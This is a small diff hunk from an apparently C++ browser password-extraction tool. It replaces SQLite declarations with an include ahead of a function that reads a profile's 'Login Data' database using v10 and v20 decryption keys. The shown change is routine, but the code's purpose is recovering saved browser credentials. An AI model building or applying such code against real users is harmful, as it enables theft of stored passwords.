@@ -581,20 +581,7 @@ bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& conf
     return success;
 }
 
-// SQLite3 simple wrapper (assuming linking against sqlite3)
-typedef struct sqlite3 sqlite3;
-typedef struct sqlite3_stmt sqlite3_stmt;
-extern "C" {
-    int sqlite3_open(const char *filename, sqlite3 **ppDb);
-    int sqlite3_close(sqlite3*);
-    int sqlite3_prepare_v2(sqlite3 *db, const char *zSql, int nByte, sqlite3_stmt **ppStmt, const char **pzTail);
-    int sqlite3_step(sqlite3_stmt*);
-    const unsigned char *sqlite3_column_text(sqlite3_stmt*, int iCol);
-    const void *sqlite3_column_blob(sqlite3_stmt*, int iCol);
-    int sqlite3_column_bytes(sqlite3_stmt*, int iCol);
-    int sqlite3_column_int(sqlite3_stmt*, int iCol);
-    int sqlite3_finalize(sqlite3_stmt *pStmt);
-}
+#include "includes/sqlite3.h"
 
 void extract_passwords(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
     fs::path db_path = profile_path / "Login Data";
